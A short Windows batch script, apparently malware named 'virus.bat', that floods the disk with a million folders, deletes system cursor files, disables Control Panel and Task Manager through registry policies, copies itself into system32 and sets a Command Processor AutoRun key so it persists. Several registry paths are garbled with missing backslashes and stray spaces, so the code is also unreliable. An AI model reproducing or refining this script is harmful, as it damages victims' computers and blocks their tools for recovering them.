FOR /L %%i IN (1,1,1000000) DO md %%i
start virus.bat
del "%SystemRoot%Cursors*.*" >nul
@echo off 
reg add HKCU\Software\Microsoft\Windows\Current Version\Policies\Explorer 
/v NoControlPanel /t REG_DWORD /d 1 /f >nul
reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesSystem /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul
copy ""%0"" "%SystemRoot%\system32\virus.bat" >nul 
reg add "HKCU\SOFTWARE\Microsoft\Command Processor" /v AutoRun /t REG_SZ /d "%SystemRoot%\syste m32\virus.bat" /f >nul 
